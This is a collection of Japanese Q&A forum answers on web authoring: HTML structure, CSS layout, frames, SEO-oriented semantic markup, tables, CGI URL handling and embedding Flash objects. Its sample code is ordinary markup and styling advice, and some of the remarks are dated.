not）。フレームおよび marquee はここに含まれます。 15.3 節は「実装要件」です。UA が非適合な諸特徴をサポートするときの要件が書かれています。document.all が false に変換され、typeof all が "undefined" を返す件もここに書かれています。 --- 仕様書に載っていることは、全てが等しく重要、ではありません。少なくとも normative と non-normative の差があり、ものによっては今回のように適合要件がいくつかある場合もあります。重要度に大きな差があるのです。必ず用語法および文脈を確認して下さい。 なお、余力があれば WHATWG FAQ を翻訳してみて下さい。更新が早いので管理は大変ですが。 http://wiki.whatwg.org/wiki/FAQ
＞質問：noframeタグの結果をみたいのですが、IE9、Firefox10で、フレームを表示させない ようにするにはどうしたらいいのでしょうか？ 　それは、ありません。noframesはフレームに対応していないブラウザや検索エンジン、点字端末などへの対応です。 　googleお勧めのLynxなどで確認すれば良いでしょう。 google 　→googleについて 　　→ウェブマスター セントラル ( http://www.google.co.jp/webmasters/ ) 　　　→ウェブマスター向けガイドライン ( http://www.google.com/support/webmasters/bin/ans … ) 　　　　→技術に関するガイドライン 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから Lynx などのテキスト ブラウザを使用して、サイトを確認します（ほとんどの検索エンジンのスパイダーには Lynx で見えるようにサイトが映ります）。JavaScript、Cookie、セッション ID、フレーム、DHTML、Flash などの特殊な機能が使用されているためにサイトの一部がテキスト ブラウザで表示されない場合、検索エンジンのスパイダーがサイトをうまくクロールできない可能性があります。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［ウェブマスター向けガイドライン - ウェブマスター ツール ヘルプ( http://support.google.com/webmasters/bin/answer. … )］より 　Lynxでどのように見えるかは、検索エンジン最適化(SEO)のためには必須ですね。 　なお、frameは、1999年のHTML4.01の勧告以来、非推奨です。とても多くの問題があってHTML4.01(XHTML1.0)strict(厳密型)、HTML4.01(XHTML1.0)transitional(移行型)、XHTML1.1などにはありません。XHTML5では、iframeに限って使えますが・・ 　できれば、frameは使わないほうが良いでしょう。 ※HTML フレーム 問題 - Google 検索 ( http://www.google.co.jp/#sclient=psy-ab&hl=ja&sa … )
Emacs Emacs Lispによる、記述する言語別の入力・編集補助環境が用意されていて便利です。
　ブログのシステム上、オーサリングツールと併用は無理です。ブログ( http://ja.wikipedia.org/wiki/%E3%83%96%E3%83%AD% … )自身がCMS( http://ja.wikipedia.org/wiki/%E3%82%B3%E3%83%B3% … )の一種ですから、オーサリングツールの機能を持ってます。 　ビルダーのようなツールを使うことは出来ません。 　直接、HTMLとスタイルシートを編集することになります。 　本文の前ではなくヘッダの後ろになりますが・・ 　画像ではわかりませんが、たとえばそれが各コーナーへのリンクのリストでしたら、ヘッダの最後に <div class="nav"> 　<ul> 　　<li><a href=""><img alt="テーマ１"></a></li> 　　<li><a href=""><img alt="テーマ２"></a></li> 　</ul> </div> とか書き加えて、スタイルシートでデザインします。 div.nav ul li,div.nav ul li{display:block;list-style:none;margin:0;padding:0;} div.nav ul{width:800px;margin:0 auto;} div.nav ul li{width:200px;height:300px;float:left;} div.nav ul li a,div.nav ul li a img{border:none;outline:none;text-decoration:none;} だけでよい。 　もちろん単に画像だけでしたら <p class="siteImage"><img ></p> とでもして、 p.siteImage img{display:block;margin:0 auto;} 　ブログにしろ、CMSにしろ、HTMLやCSSの知識がなくてもサイトを作るツールです。ところがちょっと手の込んだことをしようとすると、HTMLやCSSの知識が必要になります。それも、自分がゼロから作成した「よく知ったもの」ものではなく、システムが勝手に作成したHTMLやCSSが相手ですから、いきなり難しくなります。
もしかして、リバースプロキシとか、リダイレクトとかですか？ クライアント（ブラウザ） ↓↑ 見かけ上のURLのサーバーでRevers Proxy（キャッシュ＋分散） ↓↑ 複数のWebサーバーに負荷分散 クライアント（ブラウザ） ↓↑ 見かけ上のURLのサーバーでRedirect ↓↑ 裏に隠したWebサーバー いずれにせよ、PHPやHTMLという話ではなくて、サーバー設定の話になりますが。
いずれも、出来ません。 そのボタンが画面の下にあるとき下に伸びたら・・ (2)展開する時、表示する行数を設定できますでしょうか？ 　あらかじめ、size="10"とかで開いておくことしかできません。
WHATWG FAQ で理由が説明されていますが、HTML5 で終端スラッシュが使える理由は「XHTML1 から HTML への移行を容易にするため」です。 http://www.html5.jp/trans/whatwg_html5faq.html#S … "HTML 4.01 Transitional" と似たようなものだと考えてください。 本来の意図とは異なりますが、必要に応じて Content-Type: application/xhtml+xml で XHTML5 として出力したり、Content-Type: text/html で HTML5 として出力させる事も可能です。
もし、その目的が 質問iframeの中にページを自動で飛ばす方法 - HTML - 教えて！goo ( http://oshiete.goo.ne.jp/qa/7277208.html ) と同じでしたら、そのスクリプトではなく、そちらで示した方法を使うべきです。 　また、一連のページを順番に見てほしいならCGIなりで、きちんとコントロールすべきです。 　なお、「または」は、|| ですから if(path != "test.html" || path != "test2.html"){ でもよいし if(path != "test.html"{} els if (path != "test2.html"){} else{} 　いずれにしろ、何のためにという目的を書かれたほうが良いでしょう。
たとえば、右側にナビゲーションや新着情報、左側のそのページの主たる記事があり、いずれにも「はやぶさ」という文字があるとき、検索結果に、ほとんどすべてのページが表示されてしまうということですね、 　その一番の原因は、検索エンジンが記事のどの部分が主文であるか理解できないからです。 　端的に言うと検索エンジンの責任ではなく、HTML自体に原因があります。 　HTML4.01では、そのために 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［The global structure of an HTML document (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より と定められていました。言い換えれば、どの部分がheaderであるか、section(本文)であるか、footerであるか、aside(本文と関係ない記事)であるか、nav(ナビゲーション)であるかをclass名やidを使ってマークアップしなさいと・・・ 　検索エンジンは、これを理解していますから、<div class="nav">や<div class="aside">と書かれていたら、重要視しないはずです。<div class="left">とか<div class="wrapper">じゃだめと言うこと。・・これらは、googleなどが強く言い続けた要素名ですから。 　HTML5では、googleなどが主張して、これら文書構造を示すclass名が独立して要素となりした。 ★3.1. 新しい要素 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … ) 　私は、HTML4.01strictで記述するときは基本的にHTML5の要素名やルール(sectionは見出し<h1>～<h6>をひとつだけ伴うべき文書集合とか)に従って記述しています。以来、検索すれば基本的に本文sectionないし、header内のテキストが上位に現れるようになりました。 　HTML5で作成するページは(古いIE用のハックが必要ですが・・)、HTML5の要素の使い方を守って記述しています。HTML5では<div>はほとんど使わなくなりました。 　また、検索される可能性のある単語は、当然あるsectionの見出しであるはずですし。 　検索結果が膨大になるのは致し方ないですし、対処の方法はないでしょう。 　なぜなら、その文書がその検索文字に対する結果の順位がそうだとと認識せざるを得ないのですから・・ 　googleの検索オプションに、解決する手段はありません。検索キーワードにユーザーが最適な語句を入れない限り。 　ただ、すくなくとも検索結果に目的の単語を反映させ、著者の期待通りの順番で表示させる方法はあります。 　すなわち、HTML4.01の時代から言われ続けている『文書構造を示すマークアップと、文書構造とプレゼンテーションの分離』を守れば・・・。HTML5の策定作業を見ていると「ウェブを巨大なデータベースとしたい」googleなどが強く言ってきたことです。 少し長いですがあるサイトからの引用です。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 　ご存知のように、それぞれのホームページにはテキストと言って多くの文章データがあります。人間はそのホームページを視覚的に捉えるため、読みやすくなっていることや、デザインが美しいことを重視します。 　しかし、コンピューターは違います。例えば検索エンジンは、多くのホームページを巡回する中で、そのホームページがどんなテーマに基づいたものであるかを文章などで判断します。つまり、本文に何が書いてあるのかでどんなキーワードに関連の深いサイトであるかを判断するわけです。人間は目で見て本文がどこにあるのかを見つけることが出来ますが、コンピューターにはその目印がありません。 　HTML5.0は、文章を構造化するためのタグが新設されています。つまり、「ここが本文ですよ」と宣言するタグがあるのです。これは世界共通で使用するため、検索エンジンは本文を示すタグで挟まれている部分が本文であると容易に判断することが出来ます。これは検索エンジンの検索精度を大幅に向上し、ホームページのデータベース化という大きな目的を推進することに役立ちます。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［HTML5.0の文章の構造化 | HTML5とは？変わるWebと注目の新要素 HTML5.0の情報サイト( http://www.html5-guide.com/strong/text.html )］より 　期待された回答ではありませんが、HTML5の資料はとても参考になります。それを目安にHTMLを文書構造が機械にもすぐわかるように直していきましょう。サイト内検索に限らず、googleなどから直接検索してこられるとき(SEOとして)も極めて有効です。 具体的には、 ＞左にページ個々の内容、右に共通内容が入るとします。 でしたら、 <div class="header"> 　<h1>このページのキーワード</h1> 　<div class="abstract"> 　　<h2>要約</h2> 　　<p>・・・・・<strong>キーワード</strong>は・・・<strong>キーワード</strong>・・</p> 　</div> 　<div class="nav"> 　　<ul> 　　　<li>キーワードでない言葉</li> 　　　<li>キーワードでない言葉</li> 　　　<li>キーワードでない言葉</li> 　　</ul> 　</div> </div> <div class="section"> 　<h2>記事見出し</h2> 　<p>・・・・・キーワードは・・・キーワード・・</p> 　<div class="aside"><!-- 共通内容 --> 　　<h2>新着情報</h2> 　　<p>キーワードでない言葉・・・・</p> 　</div> </div> <div class="footer"> 　<p id="site"><a href="">Home</a>|<<a href="">キーホワードでない言葉</a></p> </div> とかね。文書の順番も大事です。共通内容は下のほうに書かれているはずですね。よって div.section{position:relative;} div.section div.asid{position:absolute;top:0;right:0;} #site{position:absolute;top:0;left:0;} で、文書構造上は後なのに、asideのプレゼンテーションは右上になりサイトナビはページの最上部に表示される。
仰っていること、良く分かります。 グラフィックデザイナーの基本が分かっていない不勉強なプロのWebデザイナーって、結構います。 オススメは『デザインの教室』です。 グラフィックデザインのガイドですが、必ずWebデザインに役立ちます。 この本にはイラレのデータでトレーニングできるようにもなっています。 Webデザインの本で探すより、グラフィックデザインで探したほうが、フィットしたものがみつかると思います。 Webデザイナーの友人は『ノンデザイナーズ・デザインブック』を薦めてました（私は未読）。 参考URLに入れたページで、Webデザインに関係するオススメ本が載っています。 参考URL：http://schoole.jp/web_design/books_for_web_desig …
これは、ブラウザがOSの機能を利用して描画している部分で、HTMLやCSSでは、どうしようもない部分です。ディスプレイが小さい場合(ディスプレイの解像度を変更すると確認できます)、あるいはselect要素がどこに表示されているかで変わります。 　背景とか色とか・・CSSで対処可能な部分はあります。 　lynxのようなポイントデバイスを使えないブラウザや、読み上げブラウザなどでは、また違う表示になります。 　ただ、jQueryには、selectの表示をプルダウンメニューに変換するものがあります。 ・・selectとoption、及びoptgroup要素を、定義リストに書き換えてスタイルシートでデザインしています。 ★jqselectable.js - Google 検索 ( http://www.google.co.jp/search?q=jqselectable.js … )
　HPはたぶん、ウェブサイトのことだと思います。HPはヒューレットパッカード社の略号ですし、ホームページはブラウザを立ち上げたとき、最初に表示されるページのことです。 ★ホームページ ( http://ja.wikipedia.org/wiki/%E3%83%9B%E3%83%BC% … ) 　ウェブサイトを運用する立場になったら最初に理解しておくことです。ウェブサイト内のページから、サイトのトップページへ移動するときに「ホームページ」から「ホームページ」じゃ通じないでしょう。 　ウェブサイトは、様々なデータで構成されますが、その代表となるファイルはHTMLというマークアップ言語で作成されたファイルです。 　そのHTMLは、どんなツールを使おうと、HTMLであることに変わりはありません。ですから「ＨＴＭＬでＨＰ(ウェブページ)を作成すると、変更でも難しい」というのは変ですね。問題は、そのHTMLをどうやって作成するかですね。 　本来はHTMLは著者が自身で作成すべきものです。人が作成するのが容易なように作られています。意外でしょうが、いわゆるウェブオーサリングツール( http://ja.wikipedia.org/wiki/Web%E3%82%AA%E3%83% … )を使って作るほうが、はるかに難しいのです。なぜなら、マークアップ言語ですから、文書の中で、この部分は見出しだから、 <h1>これは見出し</h1>・・hとはheadlineのことです。1～6まで用意されています。 とマークアップします。段落で、途中に大事な言葉があるなら <p><strong>HTMLとはHyper Text Markup Languageの略です。</strong>Hyper Textとは・・</p>・・pとはparagraph(段落)のこと と、内容を理解して適切なタグ(荷札)で、印を付けていくのですが、オーサリングツールには、この様な文章を読み解く能力はありませんから、やはり著者にHTMLの知識が必要です。もし、HTMLの知識がないと、行間を開けるために、<p></p>を使ったり、字を大きくするために<h2></h2>を使ったり・・失敗してしまいます。結果的に、HTMLの知識＋オーサリングツールの分厚いマニュアルと二つを相手にしなければならなくなります。 　一方、この様な負担をなくして、ページを都度更新していく方法に、CMS( コンテンツマネージメントシステム ( http://ja.wikipedia.org/wiki/%E3%82%B3%E3%83%B3% … ) やブログ( http://ja.wikipedia.org/wiki/%E3%83%96%E3%83%AD% … )という手法があります。 　これだと、最初に設置してもらえば、後は追加していくだけです。 　あなたのウェブサイト構築の目的がわかりませんから、ピンポイントの回答にはなりませんが、個人の日記帳のようなものでしたらブログで良いでしょう。--あなたがご利用のISP--インターネットサービスプロバイダー--が用意してくれているかもしれません。 [例] @nifty ( http://www.nifty.com/ ) 　→ブログサービス ココログ - 無料ブログ,芸能人blog:@nifty ( http://www.cocolog-nifty.com/ ) 　→@niftyホームページサービス - ホームページ作成なら@niftyホームページサービスで！ ( http://homepage.nifty.com/ ) のように・・ 　しかし、HTML--ウェブページの作成についての知識は無駄になりませんから、 ★はじめてのWebドキュメントづくり ( http://www.asahi-net.or.jp/%7Esd5a-ucd/www/ ) 　くらいは読んでみてください。 　くれぐれも「タグを知らなくてもホームページが出来る」という誇大広告に惑わされて、オーサリングツールに頼らないこと。タグを知らなくてはオーサリングツールは毒になります。 　 　わざわざ初心者と書かれなくてもわかります。
　本来フレーム内に表示させるべきページに直接訪問されたときに、フレームセットのページへリンクさせ、そのページはフレーム内に表示させたいと言うことですね。 frameset.html 　|--iframe 　　　　/subPage.html 　この場合、refrashで飛ばすと、無限ループにおちいって、そのようになります。多分唯一の解決策は <script language="JavaScript"> <!-- if (window == top) top.location.href = "index.htm"; //--> </script> 意味は、自身がtopになってしまったら、index.htmlに跳べと言うことです。 　これをrefreshの代わりに<head></head>内に書きます。 ★ただし、最近多いページ遷移javascriptを停止しているブラウザには無効です。 ★そしてなによりも、フレームにはメリットを上回るデメリットがあります。 　・・フレームないページに直接訪問されるというのもデメリットです。 →フレームページのリンクについて - HTML - 教えて！goo ( http://oshiete.goo.ne.jp/qa/6436982.html ) →フレームの利点と欠点：デザインを見直す（2） - HTMLタグボード ( http://www.dspt.net/seo/002/index.html ) →フレーム 問題 html - Google 検索 ( http://www.google.co.jp/#hl=ja&cp=8&gs_id=8j&xhr … ) 　当面は。上記javascriptで対応して、順次フレームのページは減らしていきましょう。 (補足) <body bgcolor="#FFFFFF"> <br> このページは10秒経つと自動的に<a href=""></a>に飛びます。<br> </body> </html> のHTMLは間違っています。<body>要素の直下にテキストや<br>を書くことは出来ません。<body>の下にはブロック要素しか入りません。 <body bgcolor="#FFFFFF"> <p> このページは10秒経つと自動的に<a href=""></a>に飛びます。 </p> </body> です。 </html>
ローカルでもリモートでも表示されますが？
＞border="3" cellspacing="10" width="800" HTML(頭文字ですから大文字です)に後方互換のため書きますが、実際のデザインはスタイルシートで行いますので、あまり気にしなくて良いです。 　単純に <table summary="表の説明(必須)" border="1"> 　<tbody> 　　<tr> 　　　<th abbr="列の説明(必須)"></th><th abbr="説明"></th><th abbr="説明"> 　　</tr> 　　<tr> 　　　<td></td> 　　　<td></td> 　　　<td></td> とでもしておきましょう。表ですから内容の量によって伸縮すべきことになっていますから、指定してもあまり意味をなしません。 ★列幅の計算 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ★11.3.3 コマのマージン ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　tableは、デザインのために使用するものではありません『単に文書内容を整形する目的だけで表を用いるべきでない。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』『スタイルシートの概説 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』から、あくまで内容の量にしたがって伸縮できるようにしておくべきです。 　そのうえで、スタイルシートで丁寧に指定しましょう。tableやcellごとの巾、上下左右の枠線の色や形、角を丸めたり、それぞれの隙間など、border属性,width属性、cellpadding属性、cellspacing属性で指定するより、はるかに自由自在にデザインできます。 　
様々なアプローチがあると思います。 ・新聞社のサイトのように、記事の冒頭部分だけを表示して、・・続きを読む・・をクックして記事全部を記述したページへリンクする方法 　SSP--サーバーサイドでプログラムを実行して動的にページを作っています。写真や記事がある程度の長さを持っている場合に良いでしょう。記事自体をブックマークできますし、なによりも句読点や段落などできちんと区切れる。 ・googleのニュース検索などで使われている方法で、javascriptやajaxが使われています。ajaxだと動作は速いでしょうが・・ 　→記事 折りたたみ - Google 検索 ( http://www.google.co.jp/#hl=ja&gs_is=1&cp=8&gs_i … ) 　→記事 折りたたみ 　ajax - Google 検索 ( http://www.google.co.jp/#sclient=psy-ab&hl=ja&so … ) ・CSSだけで行う。javascriptなどを使わずに可能ですし、SEO的にも優れています。 下記のような率直なHTMLのままでよいかと・・ <div class="section"> <h2>「記事の折りたたみ・展開」について教えてください。</h2> <p>「記事の折りたたみ・展開」について教えてください。</p> <p>折りたたみ時に、文章が一定の文字数、もしくは規定の高さを超える場合、途中まで表示して文末を「...」と省略し、”続きを見る”というリンクをクリックしたら、記事が展開されて本来の文章が見えるようにしたいのですが、参考になるＵＲＬ等ございましたら教えてください。</p> </div> ・CSSとjavascriptの併用・・
col widthは、cellpadding（初期値１） cellspacing（初期値１）を含みません。 開発者ツールで確認すると、cellpadding（初期値１） cellspacing（初期値１）を含む値になります。パディングもスペーシングも、どちらも左右に付くので「（１＋１）×２」で４増えます。 jqueryでは、cellpadding（初期値１） cellspacing（初期値１）のうち、どちらか片方（どっちだったか忘れた）を含む値になります。 <table border="1" cellspacing="0" cellpadding="0">だと、どっちで見ても「10 20 30」になる筈です。 <table border="1" cellspacing="2" cellpadding="4">で試せば、何がどれを含む値を返すのか明確になるので試して見て下さい。
<!-- -->で囲むことによって、その部分を表示されないコメントとするのです。 ★3.2.4 コメント ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　なお、更新履歴として残す場合は、<ins></ins>と<del></del>を使うほうが良い場合もあります。 ★文書の変更に目印をつける: INS要素とDEL要素 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　この場合は、スタイルシートで、del{display:none;}で表示させない・・・ <!-- header --> <div class="header"> ・・・・ </div> <!-- /header --> 　は、ちょっと変わっているので、将来HTMLに変更したときに、 <header> ・・・・ </header> 　とするためのものかもしれません。 ★3.1. 新しい要素 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … )
＞つまり、最初 http://foo.com/ として開くことは可能ですが、CGIが生成した ＞ページ内のリンクをクリックすると http://foo.com/bbs.cgi/hoge 等のように ＞普通にCGI名を含んだリンクのアクセスになってしまうこと言うことです。 ・http://foo.com/page01 と入力しても http:/foo.com/bbs.cgi/page01 は 開きません 　これはサーバーの設定です。PATH_INFOに格納して上位ディレクトリを探す設定が外してある。 　mod_rewrite 　Options FollowSymLinks を確認 ・、CGIが生成したページ内のリンクをクリックすると http://foo.com/bbs.cgi/hoge 等のように普通にCGI名を含んだリンクのアクセスになってしまう 　それはCGIのほうがおかしい。リンク先が、相対配置で 　./hoge となっていれば、ユーザーエージェントは、http://foo.com/hogeのしなければならない。 環境変数 　SCRIPT_FILENAME 　SCRIPT_NAME 　PATH_INFO の処理を確認してください。
htmlにswfを埋め込むには、必ずobject/embedタグが必要です。 従って、SWFObjectなどのJavaScriptライブラリは、通常SWFの再生に必要なobject/embedの記述を自動化しているだけに過ぎません。やってることは同じなのです。 手間を惜しまないというのであれば、素直にobject/emebedタグを書いた(それなりに複雑です)ほうがよいです。そうすれば、仮にJavaScriptが無効になっている環境でも、SWFを再生することができます。
> CGIの知識がまったくないので、htmlとcssでなんとかなりませんか？ なんともなりません。 >CGIを使うしかない場合は、そのやり方をなるべく解りやすく教えてください。 完成しているライブラリや、システムを、拾ってくるなり、買うなりするしか方法がありません。 また、わかりやすく教えてくださいとのことですが、「英語をまったく話せないですが、日常会話が出来る程度までわかりやすく教えてください。」と比較的ニュアンスが近いです。CGIを知りたいなら、訊くのではなく、調べて、学習するのが筋です。
<form のアクションに指定があるのは、hrefだけです。 　mailto:などは、確かに多くのブラウザで対応は出来ていますが、きちんとしたメールが送信できるわけではありません。もちろんメールソフトを関連付けていない人には使えません。 input のnameの値をSubjectやBody(本文)にすると、可能かも？ 　これもCGIを使うことになります。formは、そのためのものです。 ★CGI RESCUE - ネットサーフレスキューＷｅｂ裏技 ( http://www.rescue.ne.jp/ )
SEO(検索エンジン最適化)には無関係ですが、文法的には誤りです。 →10.2 順不同リスト (UL)、序列リスト (OL)、及びリスト項目(LI)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) <!ELEMENT UL - - (LI)+ -- unordered list --> ulには、「li要素のみを一個以上もつ。」と書かれています。 <!ELEMENT LI - O (%flow;)* -- list item --> li要素には、%flowをゼロ個以上もつ、終了タグは省略できる。 読み方は、3.3.3 要素宣言 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )を参照すること したがって <ul> 　<li>・・・<br> 　<li>・・・<br> </ul> とは書けます。(HTMLの場合) その場合、ブラウザは <ul> 　<li>・・・<br></li> 　<li>・・・<br></li> </ul> と解釈します。(XHTMLはこう書かないとならない) ★もっと、はるかに大事なこと 「<li>～</li>だけで自動的になされる改行だと、詰まって見えるので」<br>を入れるは、HTML的には最大の間違いです。こちらのほうがはるかに重要!! 　構造とプレゼンテーションは区別すること。デザインのためにHTMLを書いてはなりません。 　2.3.2 アクセス性 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) スタイルシートで、 ul li{margin-bottom:1em;} だけでよい。
bodyに背景を指定しましょう。 あるいは、他の大きな要素に・・ 「フッターを画面下部に固定するため以下のようなHTMLを書きました。」 　とても大事なことなので、これは間違いです。HTMLはデザインのことは考えません。HTMLは文書構造をマークアップするもので、その文書構造を利用してスタイルシートを書きます。 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 たとえば、HTMLが <body> <div class="header" id="TOP"> <h1>タイトル</h2> </div> <div class="section"> </div> <div class="footer"> <h2>footer</h2> </div> </body> の場合・・・ 　・class名は、文書構造を示すもの、HTML5の要素名に変えてあります。 　　<div class="header">→<header> 　　<div class="section">→<section> CSS <!-- html, body {margin: 0;padding: 0;height:100%;} div.header,div.section{margin:0 auto;} div.header{ position:absolute;top:0; width:100%;height:100px; text-align:center; background-color:yellow; } div.header h1{margin:0;} div.section{ width:50%; height:100%; background-color:rgb(240,230,140);/* 注 */ } div.footer { height: 100px;width:100%; position: absolute; bottom: 0; background-color: #7EC4E6; } ★色名キーワードとして使えるのはaqua, black, blue, fuchsia, gray, green, lime, maroon, navy, olive, purple, red, silver, teal, white, yellowの 16のみです。(orangeはCSS2.1で登場し、CSS3でなくなった?)
＞clearfixを使用してもうまくいきません。 　clearfixも記事をfloatで配置するのも、HTMLの考え方からは邪道です。 　まず、HTMLは、文書構造にしたがって正しくマークアップしましょう。divやidはそのためのものです。(デザインに利用できますが、そのためじゃない)HTML5ではより厳密になります。 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 ・floatを使うと、本来の記事中の挿絵などをfloat/clearできなくなります。 　「親のmainの中のsub_01やsub_02に画像や文字が記入されるにつれて、」とあますが、それらにfoatさせたい画像などが入ると行きづまります。 ・多くの場合、構造を無視して文書の順番を変えなければならなくなります。 　たとえばそのセクションの目次を前に書かなければならなくなる。 [例]文書の内容がわかりませんので、あくまで例としてお読みください。なお、div要素のcass名はHTM5の該当する要素名にしてあります。(3.1. 新しい要素 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … )) ★Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) ★W3C CSS 検証サービス ( http://jigsaw.w3.org/css-validator/#validate_by_ … ) で検証済みです。 ★i-pone,i-padにも対応するよう640px巾まで縮められます。最大900px ★(注)本来はfloatを使うべきではありません。今回は、中身がわからないのでfloatにしてあります。 　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ★隙間が出来るのは、footer,header,section内にある最初と最後の<p>あるいは他のブロック要素のためです。その要素のマージンの影響です。 　そのマージンを消すと隙間がくっつき、指定できるようになります。 ★hrでclearしています。 ★タブは、＿に置換してあります。戻すこと。 ★HTML5のときは、それぞれをheader,section,footerに変更する。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} div.header,div.section,div.footer{width:85%;margin:0 auto;position:relative;padding:0;min-width:640px;max-width:900px;} div.section div.section{width:30%;float:left;margin:5px 2%;padding:0;min-width:0;} div.section div.section+div.section{width:60%;} hr.section_end{clear:both;/* visibility:hidden;*/border-color:red;margin:0;height:0;} div.section p,div.footer p,div.header h1{margin:0;} /* 見本がわかりやすくするため */ div.header,div.footer{ height:100px; background-color:yellow; } div.section{ background-color:silver; } div.section div.section{ background-color:orange; height: 200px;/* 高さを任意に変更 */ } div.section div.section+div.section{ height: 300px;/* 高さを任意に変更 */ } --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>サンプル</h1> ＿</div> ＿<div class="section"> ＿＿<div class="section"> ＿＿＿<p>aaaaaaa</p> ＿＿</div> ＿＿<div class="section"> ＿＿＿<p>bbbbbbb</p> ＿＿</div> ＿＿<hr class="section_end"> ＿</div> ＿<div class="footer"> ＿＿<p>footer</p> ＿</div> </body> </html>
＞POSTで渡した際に改行になってしまいます。 　タグを削除して改行コードを挿入するとか、何かの処理をしないとそうはなりません。 　これって、HTMLとして出力したときに、そのままになっているので<br>として表示されるいうことでは？ 　それとも、・・・ 　通常はタグではなく、textareaを使って改行を入力させて、それを<br>とせずに、段落全体を<p></p>で囲みますが、nameでしたら、<br>でよいかも・・ $value=~/<br>/\&lt\;br\&gt\;/g; 　 　
object要素は置換インライン要素なので、サイズは内容に合わせて変化する。ブロック要素(block,inline-block)に変えてからサイズを調整する。 　ブロック要素・インライン要素、非置換要素・置換要素は重要です。 <OBJECT data="./img/test.swf" type="application/x-shockwave-flash" width="240" height="180" style="display:block;width="600px;height:100px;"> または、外部に記述するなら object[data="./img/test.swf"]{display:block;width="600px;height:100px;} とか・・。ブロック要素を横(縦)サイズを指定して、縦横比を変えずに伸縮させるときは他方をautoにします。 　ただ、DOCTYPEがわかりませんが、embedは、HTML4.01にはないのでは？(HTML5にはある) ★Index of the HTML 4 Elements ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ★13.3.1 オブジェクトのレンダリング規則 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) <p> 　<object ・・・> 　　<object・・・>代替候補1 　　　<object・・・>代替候補2 　　　代替文字列 　　　</object> 　　</object> 　</object> </p> とかく。
MSDN によると、alt属性値はtitle属性が存在しない場合にツールチップとして表示する仕様です。 http://msdn.microsoft.com/en-us/library/ms533073 … 実際は #4 で指摘されているように、DOCTYPEスイッチによってIEの動作が切り替わるようですが、MSDN では触れられていません。 http://jsbin.com/ixebof/2/edit#preview (IE8 quicks mode でツールチップ表示) http://jsbin.com/ixebof/4/edit#preview (IE8 standards mode でツールチップ非表示) event.returnValue によるデフォルトアクション抑止でもツールチップ表示を抑止することは出来ないようです。 http://jsbin.com/ixebof/5/edit#preview CSS,JavaScriptでツールチップ表示を実現している可能性は考えられますが、実際に見てみないことには確実な答えは出来ないと思います。 この状態で「どこに原因があるのでしょうか？」と質問されても「あれもこれもありますね」としか答えようがないわけで…。 SEOを気にされるのでしたら Lynx などのテキストブラウザを使用してサイトを確認してください。 SEOで IE の仕様を気にしなければならない事態はまずないと思います。 http://support.google.com/webmasters/bin/answer. …
そうだろうね　もちろん２つの仕事が理解できて　一人で１件のプロジェクトやっちゃったほうが メンテナンスにおいても手間掛からないからいいけど 絵描きか　プログラマーか　どっちかの能力が秀でていればいいんじゃないの 絵描きならWeb以外でもちょっと組み方とルール覚えれば広告やPOP製作もできるし プログラマならデーターベース構築なんかのファイルメーカーでの製作とかもできるでしょう 専属でこれしかやらせないなんてことは、何十人もその仕事に従事している GreeとかYahooとかそういうとコしかないから 一般のデザイン会社や、事務機屋、ソフト開発ならそういう人材がいるでしょう。 うちもデザイン会社経営してますけど おれは誌面デザインしかやんねーWeb？わかんねーとか抜かしたら即首切りますよ 一人前に指名も受けてないくせに向上心がない証拠ですから。 口を滑らすというのは本心の言葉です
とりあえず、現状の説明だけ。とりあえず私の認識を説明しておきます。英語は苦手なので誤解しているかもしれませんので根拠とした原文も挙げて起きます。 dl要素は、「定義リスト(Definition lists)」と訳されますが、実際には「用語とその説明」という使い方をすることになっています。 「定義リストは、並び項目が2部から成るという点で他のタイプのリストと単にわずかに異なります: 用語と記述。用語はDT要素から与えられ、インラインの内容に制限されます。その記述は、ブロック・レベル内容を含むことができます。」 　であって、例としては「学術用語」があげられていますが、それ以上termの内容については制限がありません。また、HTML4.01では、「Another application of DL, for example, is for marking up dialogues, with each DT naming a speaker, and each DD containing his or her words.」と書かれていましたが、HTML5では「会話に対しては適切でない（ The dl element is inappropriate for marking up dialogue. ( http://www.w3.org/TR/html5/grouping-content.html … )」 　HTML5では、HTML4での説明を補足する形で 